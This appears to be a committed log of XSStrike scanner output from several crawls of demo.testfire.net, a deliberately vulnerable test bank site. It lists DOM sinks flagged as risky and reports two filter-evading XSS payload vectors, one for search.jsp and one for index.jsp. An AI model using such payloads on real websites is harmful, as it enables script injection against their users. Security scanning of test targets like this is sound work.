@@ -1,0 +1,632 @@
+
+	XSStrike v3.1.5
+
+ Crawling the target 
+ Parsing login.jsp                               
+ 
+ Parsing status_check.jsp                        
+ 
+ Parsing ndex.jsp?content=business_retirement.htm
+ 
+ Parsing index.jsp?content=business.htm          
+ 
+ Parsing index.jsp?content=personal_loans.htm    
+ 
+ Parsing cgi.exe                                 
+ 
+ Parsing subscribe.jsp                           
+ 
+ Parsing index.jsp?content=inside_about.htm      
+ 
+ Parsing index.jsp?content=business_deposit.htm  
+ 
+ Parsing index.jsp?content=inside_contact.htm    
+ 
+ Parsing index.jsp?content=security.htm          
+ 
+ Parsing index.jsp?content=inside_press.htm      
+ 
+ Parsing index.jsp?content=personal_other.htm    
+ 
+ Parsing index.jsp?content=business_lending.htm  
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/status_check.jsp 
+------------------------------------------------------------
+38  		var jsonObj = *eval*('('+ xmlHttp.responseText + ')');
+
+43  		*x.innerHTML*=jsonFetchHostName;
+
+45  		*x.innerHTML*=jsonFetchHostStatus;
+
+50  		*x.innerHTML*=sLastHostName;
+
+52  		*x.innerHTML*='The service returned an error. Please be patient while our administrators fix the issue.';
+
+ Parsing index.jsp?content=personal.htm          
+ 
+Parsing index.jsp?content=personal_checking.htm 
+
+ Parsing swagger/index.html                      
+ 
+57  		*x.innerHTML*=sLastHostName;
+
+Parsing dex.jsp?content=personal_investments.htm
+
+59  		*x.innerHTML*='The service returned an error. The status service appears to not be available';
+
+64  		*x.innerHTML*=sLastHostName;
+
+66  		*x.innerHTML*='The service returned a 401 unauthorized error, indicating it was implemented incorrectly';
+
+71  		*x.innerHTML*=sLastHostName;
+
+73  		*x.innerHTML*='The service returned a 302 redirect, indicating it was implemented incorrectly';
+
+------------------------------------------------------------
+ Parsing index.jsp                               
+ 
+ Parsing feedback.jsp                            
+ 
+ Parsing index.jsp?content=business_insurance.htm
+ 
+ Parsing index.jsp?content=inside_investor.htm   
+ 
+ Parsing index.jsp?content=inside.htm            
+ 
+ Parsing index.jsp?content=business_cards.htm    
+ 
+ Parsing index.jsp?content=inside_careers.htm    
+ 
+ Parsing index.jsp?content=privacy.htm           
+ 
+ Parsing index.jsp?content=business_other.htm    
+ 
+ Parsing index.jsp?content=personal_deposit.htm  
+ 
+[!!] Unable to connect to the target. 
+ Parsing index.jsp?content=personal_cards.htm    
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/swagger/index.html 
+------------------------------------------------------------
+6   url: window.**location.href**.substr(0, window.**location.href**.lastIndexOf("\/") + 1) + "properties.json",
+
+------------------------------------------------------------
+ Parsing high_yield_investments.htm              
+ 
+ Parsing index.jsp?content=pr/20060720.htm       
+ 
+ Parsing index.jsp?content=pr/20061005.htm       
+ 
+ Parsing index.jsp?content=inside_benefits.htm   
+ 
+ Parsing index.jsp?content=pr/20060518.htm       
+ 
+ Parsing index.jsp?content=pr/20060817.htm       
+ 
+ Parsing index.jsp?content=inside_jobs.htm       
+ 
+ Parsing                                         
+ 
+ Parsing index.jsp?content=inside_trainee.htm    
+ 
+ Parsing claimer.htm?url=http://www.microsoft.com
+ 
+ Parsing index.jsp?content=inside_internships.htm
+ 
+ Parsing rivacypolicy.jsp?sec=Careers&template=US
+ 
+ Parsing index.jsp?content=pr/20060928.htm       
+ 
+ Parsing index.jsp?content=pr/20061109.htm       
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/high_yield_investments.htm 
+------------------------------------------------------------
+3   		var h = *document*.*location.hash*.substring(1);
+
+7   				*document*.getElementById("email").innerHTML += " ("+h+")";
+
+------------------------------------------------------------
+ Parsing index.jsp?content=pr/20060921.htm       
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/disclaimer.htm 
+------------------------------------------------------------
+ Parsing default.jsp?content=security.htm        
+ 
+4   	    var *iPos* = *document.URL*.indexOf("url=")+4;
+
+ Parsing index.jsp?content=inside_executives.htm 
+ 
+5   	var *sDst* = **document.URL**.substring(*iPos*,**document.URL**.length); 
+
+ Parsing th/Bank%20Site%20Documents/grouplife.htm
+ 
+7   		window.opener.*location.href* = *sDst*;
+
+ Potentially vulnerable objects found at http://demo.testfire.net/index.jsp 
+10  	window.*location.href* = *sDst*;
+
+18  var *iPos* = *document.URL*.indexOf("url=")+4;
+
+19  	var *sDst* = **document.URL**.substring(*iPos*,**document.URL**.length);
+
+21  	if ( *sDst*.indexOf("http") == 0 && *sDst*.indexOf(*document.location*.hostname) != -1 ) {
+
+23  		window.opener.*location.href* = "http" + *sDst*.substring(4);
+
+26  	window.*location.href* = "http" + *sDst*.substring(4);
+
+1   *document.write*(encodeURI(sDst));
+------------------------------------------------------------
+ Parsing index.jsp?content=personal_savings.htm  
+ 
+------------------------------------------------------------
+13  	if (document.*location.hash* == "#alljobs") {
+
+14  		document.*location.hash* = "";
+
+24  				document.*location.href* = "index.jsp?content="+jobs[sp[1]][sp[0]];
+
+27  				*document.write*("<h2 style='color:#ff0000'>We're sorry, but it appears the position for " + sp[0] + " in group " + sp[1] + " is not open anymore</h2>");
+
+34  	var *searchStr* = document.*location.search*.substring(1);
+
+35  	var *params* = *searchStr*.split('&');
+
+36  	for (var i=0; i < *params*.length; i++) {
+
+37  		nv = *params*[i].split('=');
+
+46  	document.*location.hash* = "alljobs";
+
+------------------------------------------------------------
+ Parsing survey_questions.jsp                    
+ 
+ Parsing index.jsp?content=inside_community.htm  
+ 
+ Parsing index.jsp?content=pr/20060413.htm       
+ 
+ Parsing inside_points_of_interest.htm           
+ 
+ Progress: 10/92
+ 
+ Progress: 20/92
+ 
+ Progress: 30/92
+ 
+ Progress: 40/92
+ 
+ Progress: 50/92
+ 
+ Progress: 60/92
+ 
+ Progress: 70/92
+ 
+ Progress: 80/92
+ 
+[++] Vulnerable webpage: http://demo.testfire.net/search.jsp 
+[++] Vector for query: <d3v/+/ONPOinTeReNter%0d=%0dconfirm()%0dx>v3dm0s 
+[++] Vulnerable webpage: http://demo.testfire.net/index.jsp 
+[++] Vector for content: <a%09OnmOusEOVER+=+confirm()%0dx>v3dm0s 
+ Progress: 90/92
+ 
+ Progress: 92/92
+ 
+
+ Crawling the target 
+ Parsing search.jsp                              
+ 
+ Parsing login.jsp                               
+ 
+ Parsing status_check.jsp                        
+ 
+ Parsing ndex.jsp?content=business_retirement.htm
+ 
+ Parsing index.jsp?content=business.htm          
+ 
+ Parsing index.jsp?content=personal_loans.htm    
+ 
+ Parsing cgi.exe                                 
+ 
+ Parsing subscribe.jsp                           
+ 
+ Parsing index.jsp?content=inside_about.htm      
+ 
+ Parsing index.jsp?content=business_deposit.htm  
+ 
+ Parsing index.jsp?content=inside_contact.htm    
+ 
+ Parsing index.jsp?content=security.htm          
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/status_check.jsp 
+------------------------------------------------------------
+38  		var jsonObj = *eval*('('+ xmlHttp.responseText + ')');
+
+43  		*x.innerHTML*=jsonFetchHostName;
+
+45  		*x.innerHTML*=jsonFetchHostStatus;
+
+50  		*x.innerHTML*=sLastHostName;
+
+52  		*x.innerHTML*='The service returned an error. Please be patient while our administrators fix the issue.';
+
+57  		*x.innerHTML*=sLastHostName;
+
+59  		*x.innerHTML*='The service returned an error. The status service appears to not be available';
+
+64  		*x.innerHTML*=sLastHostName;
+
+66  		*x.innerHTML*='The service returned a 401 unauthorized error, indicating it was implemented incorrectly';
+
+71  		*x.innerHTML*=sLastHostName;
+
+73  		*x.innerHTML*='The service returned a 302 redirect, indicating it was implemented incorrectly';
+
+------------------------------------------------------------
+ Parsing index.jsp?content=inside_press.htm      
+ 
+ Parsing index.jsp?content=personal_other.htm    
+ 
+ Parsing index.jsp?content=business_lending.htm  
+ 
+ Parsing index.jsp?content=personal.htm          
+ 
+ Parsing swagger/index.html                      
+ 
+ Parsing index.jsp                               
+ 
+ Parsing index.jsp?content=personal_checking.htm 
+ 
+ Parsing dex.jsp?content=personal_investments.htm
+ 
+ Parsing feedback.jsp                            
+ 
+ Parsing index.jsp?content=business_insurance.htm
+ 
+ Parsing index.jsp?content=inside_investor.htm   
+ 
+ Parsing index.jsp?content=inside.htm            
+ 
+ Parsing index.jsp?content=business_cards.htm    
+ 
+ Parsing index.jsp?content=inside_careers.htm    
+ 
+ Parsing index.jsp?content=privacy.htm           
+ 
+ Parsing index.jsp?content=business_other.htm    
+ 
+ Parsing index.jsp?content=personal_deposit.htm  
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/swagger/index.html 
+------------------------------------------------------------
+6   url: window.**location.href**.substr(0, window.**location.href**.lastIndexOf("\/") + 1) + "properties.json",
+
+Parsing index.jsp?content=personal_cards.htm    
+
+------------------------------------------------------------
+ Parsing high_yield_investments.htm              
+ 
+ Parsing index.jsp?content=pr/20060720.htm       
+ 
+ Parsing index.jsp?content=pr/20061005.htm       
+ 
+ Parsing index.jsp?content=inside_benefits.htm   
+ 
+ Parsing index.jsp?content=pr/20060518.htm       
+ 
+ Parsing index.jsp?content=pr/20060817.htm       
+ 
+ Parsing index.jsp?content=inside_jobs.htm       
+ 
+ Parsing                                         
+ 
+ Parsing index.jsp?content=inside_trainee.htm    
+ 
+ Parsing claimer.htm?url=http://www.microsoft.com
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/index.jsp 
+------------------------------------------------------------
+ Parsing index.jsp?content=inside_internships.htm
+ 
+13  	if (document.*location.hash* == "#alljobs") {
+
+14  		document.*location.hash* = "";
+
+24  				document.*location.href* = "index.jsp?content="+jobs[sp[1]][sp[0]];
+
+27  				*document.write*("<h2 style='color:#ff0000'>We're sorry, but it appears the position for " + sp[0] + " in group " + sp[1] + " is not open anymore</h2>");
+
+34  	var *searchStr* = document.*location.search*.substring(1);
+
+35  	var *params* = *searchStr*.split('&');
+
+36  	for (var i=0; i < *params*.length; i++) {
+
+37  		nv = *params*[i].split('=');
+
+46  	document.*location.hash* = "alljobs";
+
+------------------------------------------------------------
+ Potentially vulnerable objects found at http://demo.testfire.net/high_yield_investments.htm 
+------------------------------------------------------------
+3   		var h = *document*.*location.hash*.substring(1);
+
+7   				*document*.getElementById("email").innerHTML += " ("+h+")";
+
+------------------------------------------------------------
+ Parsing rivacypolicy.jsp?sec=Careers&template=US
+ 
+ Parsing index.jsp?content=pr/20060928.htm       
+ 
+ Parsing index.jsp?content=pr/20061109.htm       
+ 
+ Parsing index.jsp?content=pr/20060921.htm       
+ 
+ Parsing default.jsp?content=security.htm        
+ 
+ Parsing index.jsp?content=inside_executives.htm 
+ 
+ Parsing th/Bank%20Site%20Documents/grouplife.htm
+ 
+ Parsing index.jsp?content=personal_savings.htm  
+ 
+ Parsing survey_questions.jsp                    
+ 
+ Parsing index.jsp?content=inside_community.htm  
+ 
+ Parsing index.jsp?content=pr/20060413.htm       
+ 
+ Parsing inside_points_of_interest.htm           
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/disclaimer.htm 
+------------------------------------------------------------
+4   	    var *iPos* = *document.URL*.indexOf("url=")+4;
+
+5   	var *sDst* = **document.URL**.substring(*iPos*,**document.URL**.length); 
+
+7   		window.opener.*location.href* = *sDst*;
+
+10  	window.*location.href* = *sDst*;
+
+18  var *iPos* = *document.URL*.indexOf("url=")+4;
+
+19  	var *sDst* = **document.URL**.substring(*iPos*,**document.URL**.length);
+
+21  	if ( *sDst*.indexOf("http") == 0 && *sDst*.indexOf(*document.location*.hostname) != -1 ) {
+
+23  		window.opener.*location.href* = "http" + *sDst*.substring(4);
+
+26  	window.*location.href* = "http" + *sDst*.substring(4);
+
+1   *document.write*(encodeURI(sDst));
+------------------------------------------------------------
+ Progress: 10/93
+ 
+ Progress: 20/93
+ 
+ Progress: 30/93
+ 
+ Progress: 40/93
+ 
+ Progress: 50/93
+ 
+ Progress: 60/93
+ 
+ Progress: 70/93
+ 
+ Progress: 80/93
+ 
+ Progress: 90/93
+ 
+ Progress: 93/93
+ 
+
+ Crawling the target 
+ Parsing                                         
+ 
+ Parsing login.jsp                               
+ 
+ Parsing ndex.jsp?content=business_retirement.htm
+ 
+ Parsing index.jsp?content=inside_contact.htm    
+ 
+ Parsing index.jsp?content=security.htm          
+ 
+ Parsing index.jsp?content=personal.htm          
+ 
+ Parsing index.jsp                               
+ 
+ Parsing index.jsp?content=personal_checking.htm 
+ 
+ Parsing feedback.jsp                            
+ 
+ Parsing index.jsp?content=business_insurance.htm
+ 
+ Parsing index.jsp?content=privacy.htm           
+ 
+ Parsing index.jsp?content=personal_cards.htm    
+ 
+ Parsing status_check.jsp                        
+ 
+ Parsing index.jsp?content=business.htm          
+ 
+ Parsing index.jsp?content=personal_loans.htm    
+ 
+ Parsing cgi.exe                                 
+ 
+ Parsing subscribe.jsp                           
+ 
+ Parsing index.jsp?content=inside_about.htm      
+ 
+ Parsing index.jsp?content=business_deposit.htm  
+ 
+ Parsing index.jsp?content=inside_press.htm      
+ 
+ Parsing index.jsp?content=personal_other.htm    
+ 
+ Parsing index.jsp?content=business_lending.htm  
+ 
+ Parsing swagger/index.html                      
+ 
+ Parsing default.jsp?content=security.htm        
+ 
+ Parsing dex.jsp?content=personal_investments.htm
+ 
+ Parsing index.jsp?content=personal_savings.htm  
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/status_check.jsp 
+------------------------------------------------------------
+Parsing index.jsp?content=inside_investor.htm   
+
+38  		var jsonObj = *eval*('('+ xmlHttp.responseText + ')');
+
+43  		*x.innerHTML*=jsonFetchHostName;
+
+45  		*x.innerHTML*=jsonFetchHostStatus;
+
+50  		*x.innerHTML*=sLastHostName;
+
+52  		*x.innerHTML*='The service returned an error. Please be patient while our administrators fix the issue.';
+
+57  		*x.innerHTML*=sLastHostName;
+
+59  		*x.innerHTML*='The service returned an error. The status service appears to not be available';
+
+64  		*x.innerHTML*=sLastHostName;
+
+66  		*x.innerHTML*='The service returned a 401 unauthorized error, indicating it was implemented incorrectly';
+
+71  		*x.innerHTML*=sLastHostName;
+
+73  		*x.innerHTML*='The service returned a 302 redirect, indicating it was implemented incorrectly';
+
+------------------------------------------------------------
+ Parsing index.jsp?content=inside.htm            
+ 
+ Parsing survey_questions.jsp                    
+ 
+ Parsing index.jsp?content=business_cards.htm    
+ 
+ Parsing index.jsp?content=inside_careers.htm    
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/swagger/index.html 
+------------------------------------------------------------
+6   url: window.**location.href**.substr(0, window.**location.href**.lastIndexOf("\/") + 1) + "properties.json",
+
+------------------------------------------------------------
+ Parsing index.jsp?content=business_other.htm    
+ 
+ Parsing index.jsp?content=personal_deposit.htm  
+ 
+ Parsing high_yield_investments.htm              
+ 
+ Parsing index.jsp?content=pr/20060720.htm       
+ 
+ Parsing index.jsp?content=pr/20061005.htm       
+ 
+ Parsing index.jsp?content=inside_benefits.htm   
+ 
+ Parsing index.jsp?content=pr/20060518.htm       
+ 
+ Parsing index.jsp?content=pr/20060817.htm       
+ 
+ Parsing index.jsp?content=inside_jobs.htm       
+ 
+ Parsing                                         
+ 
+ Parsing index.jsp?content=inside_trainee.htm    
+ 
+ Parsing claimer.htm?url=http://www.microsoft.com
+ 
+ Parsing index.jsp?content=inside_internships.htm
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/index.jsp 
+------------------------------------------------------------
+13  	if (document.*location.hash* == "#alljobs") {
+
+14  		document.*location.hash* = "";
+
+24  				document.*location.href* = "index.jsp?content="+jobs[sp[1]][sp[0]];
+
+27  				*document.write*("<h2 style='color:#ff0000'>We're sorry, but it appears the position for " + sp[0] + " in group " + sp[1] + " is not open anymore</h2>");
+
+34  	var *searchStr* = document.*location.search*.substring(1);
+
+35  	var *params* = *searchStr*.split('&');
+
+36  	for (var i=0; i < *params*.length; i++) {
+
+37  		nv = *params*[i].split('=');
+
+46  	document.*location.hash* = "alljobs";
+
+------------------------------------------------------------
+ Parsing rivacypolicy.jsp?sec=Careers&template=US
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/disclaimer.htm 
+------------------------------------------------------------
+4   	    var *iPos* = *document.URL*.indexOf("url=")+4;
+
+5   	var *sDst* = **document.URL**.substring(*iPos*,**document.URL**.length); 
+
+7   		window.opener.*location.href* = *sDst*;
+
+10  	window.*location.href* = *sDst*;
+
+18  var *iPos* = *document.URL*.indexOf("url=")+4;
+
+19  	var *sDst* = **document.URL**.substring(*iPos*,**document.URL**.length);
+
+21  	if ( *sDst*.indexOf("http") == 0 && *sDst*.indexOf(*document.location*.hostname) != -1 ) {
+
+23  		window.opener.*location.href* = "http" + *sDst*.substring(4);
+
+26  	window.*location.href* = "http" + *sDst*.substring(4);
+
+1   *document.write*(encodeURI(sDst));
+------------------------------------------------------------
+ Parsing index.jsp?content=pr/20060928.htm       
+ 
+ Potentially vulnerable objects found at http://demo.testfire.net/high_yield_investments.htm 
+------------------------------------------------------------
+3   		var h = *document*.*location.hash*.substring(1);
+
+7   				*document*.getElementById("email").innerHTML += " ("+h+")";
+
+------------------------------------------------------------
+ Parsing index.jsp?content=pr/20061109.htm       
+ 
+ Parsing survey_questions.jsp?step=a             
+ 
+ Parsing index.jsp?content=pr/20060921.htm       
+ 
+ Parsing th/Bank%20Site%20Documents/grouplife.htm
+ 
+ Parsing index.jsp?content=inside_executives.htm 
+ 
+ Parsing index.jsp?content=inside_community.htm  
+ 
+ Parsing index.jsp?content=pr/20060413.htm       
+ 
+ Parsing inside_points_of_interest.htm           
+ 
+ Progress: 10/95
+ 
+ Progress: 20/95
+ 
+ Progress: 30/95
+ 
+ Progress: 40/95
+ 
+ Progress: 50/95
+ 
+ Progress: 60/95
+ 
+ Progress: 70/95
+ 
+ Progress: 80/95
+ 
+ Progress: 90/95
+ 
+ Progress: 95/95
+ 
+
